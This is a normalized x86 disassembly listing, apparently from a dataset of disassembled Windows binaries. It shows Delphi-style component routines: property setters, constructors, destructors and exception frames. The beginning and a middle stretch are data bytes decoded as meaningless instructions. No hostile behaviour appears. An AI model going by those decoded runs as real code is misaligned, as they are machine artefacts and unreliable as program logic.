add [ eax ] al
add [ esp + 0x44 ] al
add [ eax + 0x44e4 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1c ] ah
inc esp
add [ esp + 0x44 ] dh
add [ eax + 0x64000000 ] ah
fiadd [ eax + eax + 0x20 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
sub_44e4b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] dh
inc esp
add [ eax ] bl
add [ eax ] al
add [ ebp + ebp + 0x41 ] ah
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
or al 0xa6
inc ecx
add [ eax ] cl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x5a ] al
inc ecx
add [ eax + 0x740041a6 ] ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ esi - 0x5a3bffbf ] ah
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi - 0x147fffbf ] ch
inc esp
add [ ebx + ebp * 8 - 0x1457ffbc ] dl
inc esp
add [ ebx + ebp * 8 - 0x142fffbc ] bh
inc esp
add ah ah
jmp r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
sub_44e577
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4de85653
push ecx
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a6fc
test bl bl
jle r-xdata
mov edx esi
call sub_44e990
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44e57c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a6fc
test bl bl
jle r-xdata
mov edx esi
call sub_44e990
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44e5ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a210
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44e694
sub_44e620
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e5b0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41425c
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_414438
sub_44e668
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4044a0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4040e8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44e694
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44e990
mov edx ebx
mov eax esi
call sub_44e970
sub_44e6bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44e694
sub_44e6e8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4644f8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403540
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a788
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43f438
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e740
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_464520
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403540
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a7a4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43f438
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e798
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419db0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44e91c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44e804
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403344
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4144a4
call sub_403344
mov eax [ edi + 0x30 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419dfc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_44e854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44e89c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414418
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov edx edi
call sub_44e620
sub_44e8e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_450644
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_450688
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419e80
sub_44e928
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a0cc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44e990
sub_44e970
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414210
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419e80
pop esi
pop ebx
retn
sub_44e990
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414500
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44e9ac
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44ea14
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45a1f8
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_451ee0
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f2bc
mov edx ebp
call sub_44f31c
inc eax
je r-xdata
sub_44eaa0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44eac0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44eae0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44ef30
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44ef30
sub_44ec78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a6b8
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44eccc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403344
mov eax [ esi + 0x9c ]
call sub_403344
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44e57c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d6a0
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44ed1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414a98
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44edc8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44ee28
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44ef30
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44f068
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44f0c8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44f124
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44f188
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44edc8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4044a0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_4040e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44ee28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44ef20
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44e8e0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44e8cc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44ee28
sub_44ef30
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44efa8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4044a0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_4040e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4143bc
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4143bc
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
sub_44f010
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44f068
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4044a0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_4040e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44f0c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44f124
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44f188
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4143bc
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4034f4
test eax eax
je r-xdata
sub_44f1e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4044a0
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41a308
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44edc8
sub_44f234
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44f25c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44e6e8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44ee28
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44f2f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_415a58
mov edi eax
mov eax esi
call sub_4521cc
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44f31c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44f360
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44f385
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f38c
retn
sub_44f3c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ah dh
inc esp
add [ eax ] dl
hlt
sub_44f5d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44f624
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419db0
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44f678
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4144a4
mov edx eax
mov eax edi
call sub_450644
mov eax [ edi + 0x50 ]
call sub_403344
mov eax edi
call sub_44f9d4
mov eax [ edi + 0x4c ]
call sub_403344
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419dfc
test bl bl
jle r-xdata
call sub_403344
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_44f6e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f791
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4505cc
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44f7b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f798
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_44f7b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44f851
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
